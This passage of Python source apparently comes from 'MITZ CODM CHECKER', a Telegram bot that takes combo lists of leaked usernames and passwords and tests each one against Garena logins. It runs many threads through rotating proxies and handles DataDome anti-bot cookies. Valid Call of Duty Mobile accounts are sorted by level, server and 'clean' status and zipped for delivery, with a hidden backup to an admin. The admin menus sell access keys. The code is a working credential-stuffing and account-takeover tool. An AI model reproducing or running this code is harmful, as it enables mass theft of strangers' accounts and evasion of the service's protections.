        [BTN_ADM_KEYS, BTN_ADM_USERS],
        [BTN_ADM_PROXY, BTN_ADM_SETTINGS],
        [BTN_ADM_FILES, BTN_ADM_STATS],
        [BTN_ADM_UNLOCK if locked else BTN_ADM_LOCK, BTN_ADM_REFRESH],
        [BTN_ADM_RUNNING],
        [BTN_ADM_DEN],
        [BTN_ADM_BACK],
    )

def kb_admin_den():
    return rkb(
        [BTN_ADM_ANNOUNCE, BTN_ADM_MAINT],
        [BTN_ADM_TOPUSERS, BTN_ADM_SYSINFO],
        [BTN_ADM_MLIMIT, BTN_ADM_NOTIFHIT],
        [BTN_ADM_USERSEARCH, BTN_ADM_KEYLIST],
        [BTN_ADM_BATCHKEY, BTN_ADM_USERNOTE],
        [BTN_ADM_BACK],
    )

def kb_admin_keys():
    return rkb(
        [BTN_ADM_GEN_HOURS, BTN_ADM_GEN_DAYS],
        [BTN_ADM_GEN_MONTHS, BTN_ADM_GEN_LIFE],
        [BTN_ADM_RM_ALL_K],
        [BTN_ADM_RM_VIP_K, BTN_ADM_RM_NVIP_K],
        [BTN_ADM_BACK],
    )

def kb_admin_users():
    return rkb(
        [BTN_ADM_ADDVIP, BTN_ADM_RMVIP],
        [BTN_ADM_BAN, BTN_ADM_UNBAN],
        [BTN_ADM_ALLUSERS, BTN_ADM_RUNNING],
        [BTN_ADM_BROADCAST],
        [BTN_ADM_BACK],
    )

def kb_admin_proxy():
    return rkb(
        [BTN_ADM_UPL_PROXY, BTN_ADM_PROXY_STAT],
        [BTN_ADM_RM_PROXY, BTN_ADM_PASTE_PRX],
        [BTN_ADM_RELOAD_PRX],
        [BTN_ADM_BACK],
    )

def kb_admin_settings(cfg):
    locked = cfg.get("locked", False)
    return rkb(
        [BTN_ADM_UNLOCK if locked else BTN_ADM_LOCK],
        [BTN_ADM_SET_LIMIT, BTN_ADM_SET_VLIMIT],
        [BTN_ADM_MLIMIT, BTN_ADM_SET_THR],
        [BTN_ADM_SET_CD, BTN_ADM_SET_CONC],
        [BTN_ADM_RELOAD_CFG],
        [BTN_ADM_BACK],
    )

def kb_admin_files():
    return rkb(
        [BTN_ADM_CLR_COMBO, BTN_ADM_CLR_RES],
        [BTN_ADM_BACK],
    )

def kb_delete_confirm():
    return rkb([BTN_CANCEL])

# ─── Route helper: resolve ReplyKeyboard button text to old callback_data ────
LEVEL_BTN_MAP = {
    BTN_LVL_ALL: "lvl_all",
    BTN_LVL_100: "lvl_100",
    BTN_LVL_200: "lvl_200",
    BTN_LVL_300: "lvl_300",
    BTN_LVL_400: "lvl_400",
}
CF_BTN_MAP = {
    BTN_CF_BOTH:  "cf_both",
    BTN_CF_CLEAN: "cf_clean",
    BTN_CF_DIRTY: "cf_notclean",
}


# ════════════════════════════════════════════
#  STATS CARD
# ════════════════════════════════════════════
def _fmt_eta(done, total, start_ts=None):
    """Return ETA string if we have enough data, else empty."""
    if not start_ts or not done or not total or done >= total:
        return ""
    elapsed = time.time() - start_ts
    if elapsed < 5: return ""
    rate = done / elapsed  # accounts per second
    remaining = total - done
    eta_secs = remaining / rate
    if eta_secs < 60: return f"~{int(eta_secs)}s"
    if eta_secs < 3600: return f"~{int(eta_secs//60)}m {int(eta_secs%60)}s"
    return f"~{int(eta_secs//3600)}h {int((eta_secs%3600)//60)}m"

def _fmt_speed(done, start_ts=None):
    """Return speed string (accounts/min)."""
    if not start_ts or not done: return ""
    elapsed = time.time() - start_ts
    if elapsed < 5: return ""
    rate = done / elapsed * 60  # per minute
    if rate >= 1000: return f"{rate/1000:.1f}k/min"
    return f"{int(rate)}/min"

def stats_card(done,total,stats,ll="",cl="",result_folder=None,start_ts=None):
    pct      = int(done / total * 100) if total else 0
    valid    = stats.get('valid', 0)
    invalid  = stats.get('invalid', 0)
    has_codm = stats.get('has_codm', 0)
    no_codm  = stats.get('no_codm', 0)
    clean    = stats.get('clean', 0)
    not_clean= stats.get('not_clean', 0)
    hit_rate = f"{has_codm/valid*100:.2f}%" if valid > 0 else "—"
    acc_rate = f"{valid/(valid+invalid)*100:.1f}%" if (valid+invalid) > 0 else "—"
    speed_s  = _fmt_speed(done, start_ts)
    eta_s    = _fmt_eta(done, total, start_ts)

    # ── Dynamic progress bar ──────────────────────────────────────────────
    bar = _progress_bar(pct, 15)
    hit_badge = _hit_badge(has_codm)
    speed_fmt = _speed_color(speed_s) if speed_s else "⏳ Warming up…"

    # ── ETA display ───────────────────────────────────────────────────────
    eta_display = f"⏱ <code>{eta_s}</code>" if eta_s and eta_s != "—" else "⏱ Calculating…"

    # ── Phase label based on progress ────────────────────────────────────
    if pct == 0:     phase = "🔁 INITIALIZING"
    elif pct < 25:   phase = "⚡ JUST STARTED"
    elif pct < 50:   phase = "🔥 IN PROGRESS"
    elif pct < 75:   phase = "💥 PAST HALFWAY"
    elif pct < 100:  phase = "🏁 ALMOST DONE!"
    else:            phase = "✅ COMPLETE"

    # ── Remaining lines ───────────────────────────────────────────────────
    remaining = max(0, total - done) if total else 0

    base = (
        f"{pe(1)} <b>╔══ MITZ CODM CHECKER ══╗</b> {pe(1)}\n"
        f"{pe_sep()}\n"
        f"<b>{phase}</b>\n"
        f"{pe_sep()}\n"
        f"📊 <b>PROGRESS</b>\n"
        f"<code>{bar}</code>  <b>{pct}%</b>\n"
        f"✅ Done     : <code>{done:,}</code> / <code>{total:,}</code>\n"
        f"⏳ Remaining: <code>{remaining:,}</code> lines\n"
        f"{pe_thin()}\n"
        f"🚀 Speed    : {speed_fmt}\n"
        f"🕐 ETA      : {eta_display}\n"
        f"{pe_sep()}\n"
        f"🎯 <b>RESULTS</b>\n"
        f"✅ Valid     : <code>{valid:,}</code>  ❌ Invalid: <code>{invalid:,}</code>\n"
        f"🧼 Clean     : <code>{clean:,}</code>  🚫 Not Clean: <code>{not_clean:,}</code>\n"
        f"{pe_thin()}\n"
        f"{pe(1)} <b>CODM HITS  : <code>{has_codm:,}</code></b> {pe(1)}\n"
        f"   {hit_badge}\n"
        f"📉 No CODM  : <code>{no_codm:,}</code>\n"
        f"{pe_thin()}\n"
        f"💯 Hit Rate  : <code>{hit_rate}</code>   🎯 Acc: <code>{acc_rate}</code>\n"
        f"{pe_sep()}\n"
    )

    if ll or cl:
        base += (
            f"⚙️ <b>CONFIG</b>\n"
            f"   🎚 Level  : <b>{ll}</b>   🔍 Filter: <b>{cl}</b>\n"
            f"{pe_sep()}\n"
        )

    # ── Level range + country breakdown from result folder ─────────────
    extra = ""
    if result_folder:
        try:
            lvl, ctr, hits = parse_result_stats(result_folder)
            live_codm = stats.get("has_codm", 0)
            if live_codm > 0 and hits > 0 and hits != live_codm:
                scale = live_codm / hits
                lvl = {k: max(1, round(v*scale)) for k, v in lvl.items()}
                ctr = {k: max(1, round(v*scale)) for k, v in ctr.items()}
                hits = live_codm
            elif live_codm > 0 and hits == 0:
                hits = live_codm
            if hits > 0:
                lvl_lines = f"{pe(1)} <b>🎖 LEVEL BREAKDOWN</b>\n"
                for rng, cnt in lvl.items():
                    pct2 = cnt / hits * 100
                    bw   = int(pct2 / 10)
                    bar2 = "█" * bw + "░" * (10 - bw)
                    lvl_lines += f"  Lv{rng:<6}: <code>[{bar2}]</code> {cnt} ({pct2:.0f}%)\n"
                ctr_lines = f"{pe(1)} <b>🌏 SERVER BREAKDOWN</b>\n"
                for country, cnt in list(ctr.items())[:8]:
                    pct3 = cnt / hits * 100
                    bw3  = int(pct3 / 10)
                    bar3 = "█" * bw3 + "░" * (10 - bw3)
                    ctr_lines += f"  {country:<8}: <code>[{bar3}]</code> {cnt} ({pct3:.0f}%)\n"
                extra = (
                    f"{lvl_lines}"
                    f"{pe_thin()}\n"
                    f"{ctr_lines}"
                    f"{pe_sep()}\n"
                )
        except: pass

    footer = f"📡 /check — refresh  ·  🛑 /stop — stop  ·  ❌ /cancel — cancel"
    return base + extra + footer

# ════════════════════════════════════════════
#  ZIP + CLEANUP
# ════════════════════════════════════════════
TG_MAX_BYTES = 49 * 1024 * 1024   # 49 MB — just under Telegram 50 MB limit

def zip_results(folder, out):
    """Zip result files. Returns list of Path(s) — split into parts if > 49 MB."""
    files = sorted([f for f in folder.rglob("*") if f.is_file() and f != out and not f.name.endswith(".zip")])
    if not files: return []
    # Try single zip first
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zf:
        for f in files: zf.write(f, f.relative_to(folder))
    if out.stat().st_size <= TG_MAX_BYTES:
        return [out]
    # Too big — split into parts by file
    out.unlink()
    parts=[]; part_num=1; cur_files=[]; cur_size=0
    for f in files:
        fsize = f.stat().st_size
        if cur_files and cur_size + fsize > TG_MAX_BYTES:
            pout = out.parent / f"{out.stem}_part{part_num}{out.suffix}"
            with zipfile.ZipFile(pout, "w", zipfile.ZIP_DEFLATED) as zf:
                for cf in cur_files: zf.write(cf, cf.relative_to(folder))
            parts.append(pout); part_num += 1; cur_files = []; cur_size = 0
        cur_files.append(f); cur_size += fsize
    if cur_files:
        pout = out.parent / f"{out.stem}_part{part_num}{out.suffix}"
        with zipfile.ZipFile(pout, "w", zipfile.ZIP_DEFLATED) as zf:
            for cf in cur_files: zf.write(cf, cf.relative_to(folder))
        parts.append(pout)
    return parts

# ════════════════════════════════════════════
#  RESULT FOLDER STATS PARSER
# ════════════════════════════════════════════
def parse_result_stats(result_folder):
    from collections import defaultdict
    folder=Path(result_folder)
    if not folder.exists(): return {},{},0
    level_counts=defaultdict(int); country_counts=defaultdict(int); total=0
    LEVEL_ORDER=["1-50","51-100","101-150","151-200","201-250","251-300","301-350","351+"]
    seen_accounts: set = set()   # global dedup so no account counted twice
    for status_dir in folder.iterdir():
        if not status_dir.is_dir() or status_dir.name not in ("Clean","NotClean"): continue
        for country_dir in status_dir.iterdir():
            if not country_dir.is_dir(): continue
            country=country_dir.name
            for txt in country_dir.glob("*_accounts.txt"):
                lr=txt.stem.replace("_accounts","")
                try:
                    unique_n=0
                    for line in txt.read_text(encoding="utf-8",errors="ignore").splitlines():
                        line=line.strip()
                        if line and line not in seen_accounts:
                            seen_accounts.add(line); unique_n+=1
                    if unique_n>0:
                        level_counts[lr]+=unique_n
                        country_counts[country]+=unique_n
                        total+=unique_n
                except: pass
    sorted_lvl={k:level_counts[k] for k in LEVEL_ORDER if k in level_counts}
    sorted_ctr=dict(sorted(country_counts.items(),key=lambda x:-x[1]))
    return sorted_lvl,sorted_ctr,total

def get_folder_stats(result_folder) -> dict:
    """Return {valid,invalid,clean,not_clean,has_codm,no_codm,total} counted from
    the Clean/ and NotClean/ subfolders inside result_folder.
    Used to reconstruct pre-crash hit counts for auto-resume."""
    folder=Path(result_folder)
    if not folder.exists(): return {}
    clean=not_clean=0
    for status_dir in folder.iterdir():
        if not status_dir.is_dir(): continue
        if status_dir.name=="Clean":
            for txt in status_dir.rglob("*_accounts.txt"):
                try: clean+=sum(1 for l in txt.read_text(encoding="utf-8",errors="ignore").splitlines() if l.strip())
                except: pass
        elif status_dir.name=="NotClean":
            for txt in status_dir.rglob("*_accounts.txt"):
                try: not_clean+=sum(1 for l in txt.read_text(encoding="utf-8",errors="ignore").splitlines() if l.strip())
                except: pass
    has_codm=clean+not_clean
    if has_codm==0: return {}
    # total=0 means "processed count unknown from files alone" — do not use for progress bar
    return {"valid":has_codm,"invalid":0,"clean":clean,"not_clean":not_clean,
            "has_codm":has_codm,"no_codm":0,"total":0}

def update_persisted_stats(uid: str, stats: dict):
    """Patch live_stats_snapshot into an existing persisted session without
    overwriting all other fields (safe to call from background threads)."""
    try:
        ps=load_persisted_sessions()
        if uid in ps:
            ps[uid]["live_stats_snapshot"]=stats
            with open(SESSIONS_FILE,"w",encoding="utf-8") as f: json.dump(ps,f,indent=2)
    except: pass

def merge_stats(base: dict, extra: dict) -> dict:
    """Add every numeric field in extra into base; returns new dict."""
    result=dict(base)
    for k in ("valid","invalid","clean","not_clean","has_codm","no_codm","total"):
        result[k]=result.get(k,0)+extra.get(k,0)
    return result

def run_checker(uid, combo_file, result_folder, limit, threads, stop_event,
                bot_token, chat_id, thresholds, clean_filter, progress_cb=None, is_resume=False):
    try:
        if not CHECKER_OK:
            return {"error": f"Checker unavailable: {CHECKER_ERR}"}

        _ckpt_file = Path(str(combo_file) + ".ckpt")
        if not is_resume:
            try:
                if _ckpt_file.exists(): _ckpt_file.unlink()
            except: pass
        _ckpt_lock = threading.Lock()
        _ckpt_buf  = []
        _CKPT_FLUSH = 100

        def _load_checkpoint():
            if not _ckpt_file.exists(): return set()
            try:
                with open(_ckpt_file,"r",encoding="utf-8") as _cf:
                    return {int(l.strip()) for l in _cf if l.strip().isdigit()}
            except: return set()

        def _flush_checkpoint():
            if not _ckpt_buf: return
            try:
                with open(_ckpt_file,"a",encoding="utf-8") as _cf:
                    _cf.write("\n".join(str(i) for i in _ckpt_buf)+"\n")
                _ckpt_buf.clear()
            except: pass

        def _mark_done(idx):
            with _ckpt_lock:
                _ckpt_buf.append(idx)
                if len(_ckpt_buf) >= _CKPT_FLUSH:
                    _flush_checkpoint()

        accounts=[]
        for enc in ("utf-8","latin-1","cp1252","iso-8859-1"):
            try:
                with open(combo_file,"r",encoding=enc) as f:
                    accounts=[ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("===")]
                break
            except UnicodeDecodeError: continue
        if not accounts:
            try:
                with open(combo_file,"r",encoding="utf-8",errors="ignore") as f:
                    accounts=[ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("===")]
            except: pass
        if not accounts:
            return {"error":"No valid accounts found."}
        if limit and limit>0:
            accounts=accounts[:limit]

        _already_done = _load_checkpoint()
        if _already_done:
            log.info(f"[{uid}] Checkpoint: skipping {len(_already_done):,} already-checked lines")
        _all_items = [(i, line) for i, line in enumerate(accounts) if i not in _already_done]
        total=len(accounts)
        result_folder.mkdir(parents=True,exist_ok=True)
        del accounts
        _already_done.clear()
        import gc as _gc_rc; _gc_rc.collect()

        if not _all_items:
            if is_resume and _already_done:
                log.info(f"[{uid}] Resume: all {total:,} lines already in checkpoint "
                         f"— stale session, nothing left to process. Cleaning up.")
                try: _ckpt_file.unlink()
                except: pass
            elif not is_resume and _already_done:
                log.warning(f"[{uid}] Fresh run: stale checkpoint blocked all {total:,} lines! "
                            f"Cleared checkpoint — please start again.")
                try: _ckpt_file.unlink()
                except: pass
                return {"error": "Stale checkpoint cleared. Please start the check again — it will now run normally."}
            else:
                log.warning(f"[{uid}] _all_items empty for unknown reason (accounts={total}, done={len(_already_done)})")
            return {}

        # ── FIX: Create ResultsManager and AccountFileManager ──────────
        combo_file_path = str(combo_file)
        file_manager = AccountFileManager(combo_folder=str(combo_file.parent))
        results_manager = ResultsManager(combo_file_path, create_dirs=False)
        results_manager.base_dir = result_folder
        for sub in ('Country', 'Level', 'Garena Shells'):
            (results_manager.base_dir / sub).mkdir(parents=True, exist_ok=True)
        if CHECK_OTHER_GAMES:
            (results_manager.base_dir / 'Games').mkdir(parents=True, exist_ok=True)

        import queue as _queue_mod
        # use local module for hit queues
        if not hasattr(run_checker, "_HIT_QUEUES"):
            run_checker._HIT_QUEUES = {}
        _HIT_QUEUES = run_checker._HIT_QUEUES

        MAX_WORKER_THREADS = threads

        cm=CookieManager(); ls=LiveStats(); fl=threading.Lock(); tl=threading.local(); il=threading.Lock()
        with sessions_lock:
            if uid in active_sessions:
                active_sessions[uid]["live_stats"]=ls

        _HIT_QUEUES = run_checker._HIT_QUEUES
        if not hasattr(run_checker, "_orig_send_global"):
            run_checker._orig_send_global = None
        if not hasattr(run_checker, "_registry_send"):
            def _registry_send(token, cid_arg, message, parse_mode='HTML'):
                _msg = (
                    f"{pe('fire')} <b>🎯 LIVE HIT DETECTED!</b> {pe('fire')}\n"
                    f"{pe_sep()}\n"
                    f"{message}\n"
                    f"{pe_sep()}\n"
                    f"{pe('check')} Another one bites the dust! {pe('check')}"
                )
                q = _HIT_QUEUES.get((token, str(cid_arg)))
                if q is not None:
                    q.put(_msg); return None
                if run_checker._orig_send_global:
                    return run_checker._orig_send_global(token, cid_arg, _msg, parse_mode)
                return None
            run_checker._registry_send = _registry_send

        _hit_queue = _queue_mod.Queue()
        _registry_key = (bot_token, str(chat_id))
        _HIT_QUEUES[_registry_key] = _hit_queue

        def _hit_sender():
            import requests as _req
            _last_sent = [0.0]
            _MIN_INTERVAL = 1.0
            while True:
                msg = _hit_queue.get()
                if msg is None:
                    remaining = []
                    while not _hit_queue.empty():
                        try:
                            item = _hit_queue.get_nowait()
                            if item is not None: remaining.append(item)
                        except: break
                    for rem_msg in remaining:
                        for _attempt in range(3):
                            try:
                                r = _req.post(
                                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
                                    data={"chat_id":chat_id,"text":rem_msg,"parse_mode":"HTML"},
                                    timeout=15)
                                if r.status_code==200: break
                            except: pass
                            time.sleep(1)
                    break
                _elapsed = time.time() - _last_sent[0]
                if _elapsed < _MIN_INTERVAL:
                    time.sleep(_MIN_INTERVAL - _elapsed)
                for _attempt in range(3):
                    try:
                        r = _req.post(
                            f"https://api.telegram.org/bot{bot_token}/sendMessage",
                            data={"chat_id":chat_id,"text":msg,"parse_mode":"HTML"},
                            timeout=15)
                        if r.status_code==200:
                            _last_sent[0] = time.time()
                            break
                        if r.status_code==429:
                            retry_after=r.json().get("parameters",{}).get("retry_after",5)
                            time.sleep(min(retry_after,10))
                    except: pass
                    time.sleep(1)

        threading.Thread(target=_hit_sender,daemon=True,name=f"hitsend-{uid}").start()

        tg_cfg=(bot_token,str(chat_id),thresholds,"",clean_filter)

        _null_handler = logging.NullHandler()
        _dty_logger   = logging.getLogger()
        class _SilentConsole:
            def print(self, *a, **kw): pass
            def __getattr__(self, name): return lambda *a,**kw: None
        _real_console = None
        try:
            import rich.console as _rcon
            _real_console = _rcon.Console
        except: pass

        _SESSION_RECYCLE = 200

        # Parse line function
        def _parse_line(line):
            import urllib.parse as _up
            _SCHEMES = ("http://","https://","socks5://","socks4://","ftp://")
            line = line.strip()
            if not line: return None
            ll = line.lower()
            if any(ll.startswith(s) for s in _SCHEMES):
                try:
                    p = _up.urlparse(line)
                    _ip_re = __import__("re").compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
                    if p.username and p.password and not _ip_re.match(p.username):
                        return _up.unquote(p.username), _up.unquote(p.password)
                except: pass
                after = line.split("://", 1)[1]
                segs = after.split(":")
                start = 0
                for i2, seg in enumerate(segs):
                    s = seg.strip().split("/")[0]
                    if s.isdigit():
                        start = i2 + 1; continue
                    dots = s.split(".")
                    if len(dots) == 4 and all(d.isdigit() for d in dots):
                        start = i2 + 1; continue
                    if "@" not in s and "." in s and i2 == 0:
                        start = i2 + 1; continue
                    break
                creds = [s.strip() for s in segs[start:] if s.strip()]
                if len(creds) >= 2:
                    return creds[0], creds[1]
                return None
            colon = line.find(":")
            if colon < 0: return None
            user = line[:colon].strip()
            rest = line[colon + 1:]
            scheme_pos = -1
            for s in _SCHEMES:
                p = rest.lower().find(s)
                if p >= 0 and (scheme_pos < 0 or p < scheme_pos):
                    scheme_pos = p
            if scheme_pos > 0:
                before = rest[:scheme_pos].rstrip(":")
                pwd = before.split(":")[-1].strip() if ":" in before else before.strip()
            else:
                pwd = rest.split(":")[0].strip()
            if not user or not pwd: return None
            return user, pwd

        # ── Silence loggers ────────────────────────────────────────────
        import logging as _log_mod
        if not hasattr(run_checker, "_logger_lock"):
            run_checker._logger_lock  = threading.Lock()
            run_checker._logger_count = [0]
            run_checker._logger_state = [None]

        _BOT_KEEP_PREFIXES = ("telegram", "httpx", "asyncio", "TyrantBot",
                              "apscheduler", "PTB", "urllib3", "hpack")

        def _silence_all_loggers():
            with run_checker._logger_lock:
                run_checker._logger_count[0] += 1
                if run_checker._logger_count[0] > 1:
                    return None
                saved = {}
                saved['root_handlers'] = []
                saved['root_level']    = None
                saved['loggers'] = {}
                for name, lgr in list(_log_mod.Logger.manager.loggerDict.items()):
                    if isinstance(lgr, _log_mod.Logger):
                        if any(name.startswith(k) for k in _BOT_KEEP_PREFIXES):
                            continue
                        saved['loggers'][name] = (lgr.handlers[:], lgr.level, lgr.propagate)
                        lgr.handlers = []; lgr.setLevel(_log_mod.CRITICAL + 1)
                        lgr.propagate = False
                run_checker._logger_state[0] = saved
                return saved

        def _restore_all_loggers(saved):
            with run_checker._logger_lock:
                if run_checker._logger_count[0] > 0:
                    run_checker._logger_count[0] -= 1
                if run_checker._logger_count[0] > 0:
                    return
                state = run_checker._logger_state[0]
                if not state:
                    return
                for name, (handlers, level, propagate) in state.get('loggers', {}).items():
                    lgr = _log_mod.Logger.manager.loggerDict.get(name)
                    if isinstance(lgr, _log_mod.Logger):
                        lgr.handlers = handlers; lgr.setLevel(level); lgr.propagate = propagate
                run_checker._logger_state[0] = None

        if _real_console is not None:
            pass

        _real_stderr = sys.stderr

        _proxy_errors   = {}
        _proxy_attempts = {}
        _track_lock     = threading.Lock()
        _ERR_KW = (
            b"connection aborted", b"remote end closed", b"proxy dead",
            b"rate-limited", b"connection without response",
            b"error getting datadome", b"connectionerror",
        )

        def _cur_proxy_file():
            try:
                pf=geo_rotator._proxy_files; fi=geo_rotator._file_idx
                if pf: return os.path.basename(pf[fi % len(pf)])
            except: pass
            return ""

        done=[0]
        _fail_count   = [0]
        _first_err    = [None]
        _fail_lock    = threading.Lock()
        _thread_sink = threading.local()
        _stdout_swap_lock = threading.Lock()

        import logging as _lmod
        _saved_log = _silence_all_loggers()

        from concurrent.futures import ThreadPoolExecutor as _TpExec
        _DIRECT_WORKERS      = max(1, min(threads, 50))
        _SUBMIT_STAGGER      = 0.02
        _MAX_DIRECT_RETRIES  = 3
        _BLOCK_COOLDOWN      = 3
        _direct_pool = _TpExec(max_workers=_DIRECT_WORKERS)
        _submit_sem  = threading.Semaphore(_DIRECT_WORKERS * 4)

        _tls = threading.local()

        def _get_thread_session():
            count = getattr(_tls, 'call_count', _SESSION_RECYCLE + 1)
            if count >= _SESSION_RECYCLE or not hasattr(_tls, 'sess'):
                _dm_t = DataDomeManager()
                _s_t  = create_thread_session(CookieManager(), _dm_t)
                cookies = cm.get_valid_cookies()
                if cookies:
                    applyck(_s_t, '; '.join(cookies))
                    for part in cookies[-1].split(';'):
                        part = part.strip()
                        if part.startswith('datadome='):
                            _dm_t.set_datadome(part.split('=', 1)[1].strip())
                            break
                else:
                    dd = get_datadome_cookie(_s_t)
                    if dd:
                        _dm_t.set_datadome(dd)
                        _s_t.cookies.set('datadome', dd, domain='.garena.com')
                proxy = geo_rotator.get_proxies()
                if proxy:
                    _s_t.proxies.update(proxy)
                _tls.sess = _s_t
                _tls.dm   = _dm_t
                _tls.call_count = 0
            _tls.call_count += 1
            return _tls.sess, _tls.dm

        _pending_lock  = threading.Lock()
        _pending_done  = [0]
        _pending_total = [0]
        _all_done_evt  = threading.Event()

        def _on_result(acct, pwd, result, _i):
            with fl:
                done[0] += 1
            _mark_done(_i)
            with _pending_lock:
                _pending_done[0] += 1
                if _pending_done[0] >= _pending_total[0]:
                    _all_done_evt.set()

        # Pre-warm sessions
        import concurrent.futures as _cf_pw
        _pw_futs = [_direct_pool.submit(_get_thread_session) for _ in range(_DIRECT_WORKERS)]
        _cf_pw.wait(_pw_futs, timeout=30)
        del _pw_futs

        try:
            for i, line in _all_items:
                if stop_event.is_set():
                    break
                if ":" not in line:
                    continue
                parsed = _parse_line(line)
                if not parsed:
                    continue
                acct, pwd = parsed
                if not acct or not pwd:
                    continue

                with _pending_lock:
                    _pending_total[0] += 1

                def _make_cb(_i=i):
                    def _cb(a, p, r):
                        try:
                            _on_result(a, p, r, _i)
                        except Exception as _cbe:
                            with _fail_lock:
                                _fail_count[0] += 1
                                if _first_err[0] is None:
                                    _first_err[0] = str(_cbe)
                    return _cb

                def _direct_run(_a=acct, _p=pwd, _cb=_make_cb()):
                    _r2 = ""
                    for _attempt in range(_MAX_DIRECT_RETRIES + 1):
                        if stop_event.is_set():
                            _r2 = "STOPPED"
                            break
                        try:
                            _s2, _dm2 = _get_thread_session()
                            _r2  = processaccount(
                                _s2, _a, _p, cm, _dm2, ls,
                                results_manager, file_manager, combo_file_path, auto_remove=False,
                                use_elegant_display=False, suppress_print=True,
                                proxy_manager=None, stop_event=stop_event
                            )
                        except Exception as _de:
                            with _fail_lock:
                                _fail_count[0] += 1
                                if _first_err[0] is None: _first_err[0] = str(_de)
                            try: _tls.call_count = _SESSION_RECYCLE + 1
                            except: pass
                            _r2 = ""
                            break

                        if _r2 in ("BLOCKED_RETRY", "IP_CHANGED"):
                            if _attempt < _MAX_DIRECT_RETRIES:
                                if _r2 == "BLOCKED_RETRY":
                                    ls.update_stats(proxy_rotated=True)
                                    geo_rotator.force_rotate()
                                    try: _tls.call_count = _SESSION_RECYCLE + 1
                                    except: pass
                                    stop_event.wait(_BLOCK_COOLDOWN)
                                # if IP_CHANGED, we just retry immediately
                                continue
                            else:
                                ls.update_stats(skipped_403=True)
                                _r2 = ""
                                break
                        elif _r2 == "STOPPED":
                            break
                        else:
                            # DONE or ERROR or other, break out and call cb
                            break
                    _cb(_a, _p, _r2)

                _submit_sem.acquire()
                def _direct_run_sem(_fn=_direct_run):
                    try:
                        _fn()
                    finally:
                        _submit_sem.release()
                # Submit with a timeout wrapper to prevent indefinite hanging
                future = _direct_pool.submit(_direct_run_sem)
                # We don't wait here; we let the pool handle concurrency.
                # But we can set a timeout per account if needed.
                # Instead, we rely on the internal retry mechanism and stop_event.

                if not stop_event.is_set():
                    time.sleep(_SUBMIT_STAGGER)

            with _pending_lock:
                if _pending_total[0] == 0:
                    _all_done_evt.set()

            _last_progress = [done[0]]
            while not _all_done_evt.is_set():
                if stop_event.is_set():
                    break
                _all_done_evt.wait(timeout=0.5)
                if progress_cb and done[0] != _last_progress[0]:
                    try:
                        progress_cb(done[0], total)
                        _last_progress[0] = done[0]
                    except Exception:
                        pass

        finally:
            _restore_all_loggers(_saved_log)
            with _ckpt_lock:
                _flush_checkpoint()
            if _direct_pool is not None:
                _direct_pool.shutdown(wait=True)

        _warn = []
        for _pfn, _att in _proxy_attempts.items():
            _err = _proxy_errors.get(_pfn,0)
            if _att >= 20 and _err/_att >= 0.80:
                _warn.append((_pfn, _att, _err))
        if _warn:
            _warn_lines = "\n".join(
                f"   <code>{f}</code>  {e}/{a} errors ({int(e/a*100)}%)"
                for f,a,e in _warn)
            _warn_text = (
                f"{pe('warn')} <b>Proxy Warning</b>\n"
                f"{pe_sep()}\n"
                f"High error rate detected during checking:\n\n"
                f"{_warn_lines}\n"
                f"{pe_sep()}\n"
                f"Errors: Connection aborted / Remote end closed\n"
                f"Use /removeproxy or /pasteproxy to replace."
            )
            _cfg_w=load_config()
            for _aid in _cfg_w.get("admin_ids",[]):
                try:
                    import requests as _rw
                    _rw.post(
                        f"https://api.telegram.org/bot{bot_token}/sendMessage",
                        data={"chat_id":_aid,"text":_warn_text,"parse_mode":"HTML"},
                        timeout=10)
                except: pass

        _HIT_QUEUES.pop(_registry_key, None)
        _hit_queue.put(None)

        _processed = ls.get_stats().get("total", 0)
        _valid_items = sum(1 for _, ln in _all_items if ":" in ln)
        if _processed == 0 and _fail_count[0] > 0 and _fail_count[0] >= min(_valid_items, 5):
            _err_detail = _first_err[0] or "unknown error"
            log.error(f"[{uid}] All {_fail_count[0]} accounts failed in process_one! First error: {_err_detail}")
            return {"error": (f"All {_fail_count[0]:,} accounts failed to check.\n\n"
                              f"First error: {_err_detail[:300]}\n\n"
                              f"Possible causes:\n"
                              f"• Proxy misconfiguration or dead proxies\n"
                              f"• Missing dependency in MITZv3\n"
                              f"• Network issue on the server\n\n"
                              f"Check Railway logs for details.")}

        _final_stats = ls.get_stats()
        return _final_stats
    except Exception as e:
        log.error(f"run_checker crashed for uid={uid}: {e}", exc_info=True)
        return {"error": f"Checker crashed: {str(e)[:300]}"}


# ════════════════════════════════════════════
#  DELIVER RESULTS
# ════════════════════════════════════════════
async def deliver_results(bot,chat_id,uid,zip_paths,stats,combo_file=None,note="",partial=False):
    """Send results summary + zip(s).
    zip_paths : Path | list[Path] | None
    partial   : True = keep combo, label as partial and continue
    After final delivery: silently backup to admin then delete result files.
    """
    if partial:
        icon = ""; label = "Partial Results"
    elif note:
        icon = ""; label = "Stopped"
    else:
        icon = ""; label = "Finished"
    t = stats.get("total",0)
    clean_kb = InlineKeyboardMarkup([[InlineKeyboardButton(" Delete All Bot Messages",callback_data="delete_all_msgs")]])
    try:
        hits    = stats.get("has_codm", 0)
        total   = t
        valid   = stats.get("valid", 0)
        invalid = stats.get("invalid", 0)
        clean   = stats.get("clean", 0)
        notclean= stats.get("not_clean", 0)
        no_codm = stats.get("no_codm", 0)
        acc_pct = int(hits / valid * 100) if valid else 0
        badge   = _hit_badge(hits)

        _body  = f"{pe(5)} <b>{label}!</b> {pe(5)}\n"
        _body += f"{pe_sep()}\n"
        _body += f"{pe(3)} {badge} {pe(3)}\n"
        _body += f"{pe_sep()}\n"
        _body += f"{pe(2)} <b>RESULTS BREAKDOWN</b> {pe(2)}\n"
        _body += f"{pe_thin()}\n"
        _body += f"{pe(2)} Processed  : <b><code>{total:,}</code></b>\n"
        _body += f"{pe(2)} Valid       : <code>{valid:,}</code>  {pe(1)} Invalid : <code>{invalid:,}</code>\n"
        _body += f"{pe(2)} Clean       : <code>{clean:,}</code>  {pe(1)} Dirty   : <code>{notclean:,}</code>\n"
        _body += f"{pe_sep()}\n"
        _body += f"{pe(3)} 🎯 CODM HITS : <b><code>{hits:,}</code></b>  {pe(1)} No CODM : <code>{no_codm:,}</code>\n"
        if valid:
            _body += f"{pe(1)} Hit Rate  : {_progress_bar(acc_pct)} <code>{acc_pct}%</code>\n"
        _body += f"{pe_sep()}\n"
        if partial:
